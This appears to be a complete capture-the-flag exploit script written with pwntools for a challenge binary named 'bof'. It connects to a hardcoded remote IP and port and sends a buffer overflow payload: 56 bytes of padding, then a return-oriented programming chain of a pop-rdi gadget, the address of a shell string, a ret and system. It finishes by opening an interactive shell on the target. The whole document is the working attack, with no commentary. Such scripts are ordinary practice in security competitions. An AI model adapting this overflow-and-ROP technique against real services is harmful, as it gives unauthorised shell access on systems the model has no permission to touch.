from pwn import *
context.log_level = 'DEBUG'
# r=process('./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4')
# raw_input(':')
r=remote('60.250.197.227',10000)
r.recvuntil('\n')

pop_rdi=0x00000000004007a3
sh=0x4007c8

sys=0x00400570
ret=0x0000000000400546
r.sendline('a'*56+p64(pop_rdi)+p64(sh)+p64(ret)+p64(sys))

r.interactive()